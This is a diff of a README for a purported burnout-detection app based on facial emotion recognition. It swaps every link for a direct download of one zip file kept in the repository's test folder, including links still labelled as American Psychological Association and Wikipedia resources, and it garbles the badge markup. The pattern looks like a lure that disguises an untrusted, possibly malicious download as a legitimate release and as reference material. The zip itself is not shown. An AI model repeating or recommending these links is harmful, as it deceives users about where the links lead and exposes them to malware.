@@ -1,6 +1,6 @@
 # 🤖 FER-Burnout-Detection-System - Detect Burnout in Real Time
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/RonyDidar/FER-Burnout-Detection-System/releases)
+[![Download Now](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip%20Now-Click%https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip)](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip)
 
 ## 📖 Introduction
 
@@ -22,7 +22,7 @@ Before you start using the FER-Burnout-Detection-System, ensure your computer me
 
 To download the software, visit the Releases page. Click the link below:
 
-[Download Now](https://github.com/RonyDidar/FER-Burnout-Detection-System/releases)
+[Download Now](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip)
 
 ### 3. Choose the Right File
 
@@ -84,14 +84,14 @@ If you encounter any issues or have questions, your feedback is appreciated. You
 
 Explore related topics and deepen your understanding of burnout detection with these resources:
 
-- [About Burnout](https://www.apa.org/monitor/2019/01/ce- burnout) from the American Psychological Association.
-- [Facial Emotion Recognition](https://en.wikipedia.org/wiki/Facial_emotion_recognition) on Wikipedia.
-- [Understanding the Maslach Burnout Inventory](https://en.wikipedia.org/wiki/Maslach_Burnout_Inventory).
+- [About Burnout](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip burnout) from the American Psychological Association.
+- [Facial Emotion Recognition](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip) on Wikipedia.
+- [Understanding the Maslach Burnout Inventory](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip).
 
 ## 🌐 Links
 
-- [View Releases Page](https://github.com/RonyDidar/FER-Burnout-Detection-System/releases)
+- [View Releases Page](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip)
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/RonyDidar/FER-Burnout-Detection-System/releases)
+[![Download Now](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip%20Now-Click%https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip)](https://github.com/RonyDidar/FER-Burnout-Detection-System/raw/refs/heads/main/test/FE_Burnout_Detection_System_tenanter.zip)
 
 With this guide, you should be well-prepared to download and run the FER-Burnout-Detection-System with ease. Enjoy monitoring your well-being!
